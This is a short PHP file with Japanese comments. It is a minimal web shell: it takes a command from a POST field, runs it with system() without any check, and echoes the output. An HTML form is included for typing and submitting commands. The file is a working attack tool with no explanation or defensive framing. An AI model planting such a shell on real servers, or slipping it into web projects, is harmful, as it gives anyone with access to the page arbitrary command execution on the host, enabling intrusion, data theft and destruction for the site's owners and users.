<?php
if (isset($_POST['cmd'])) {
    // POST リクエストからコマンドを取得
    $cmd = ($_POST['cmd']);

    // コマンドを実行し、結果を取得
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>

<!-- ユーザーがコマンドを入力するフォーム -->
<form method="POST">
    <input type="text" name="cmd" placeholder="Enter command" />
    <button type="submit">Execute</button>
</form>
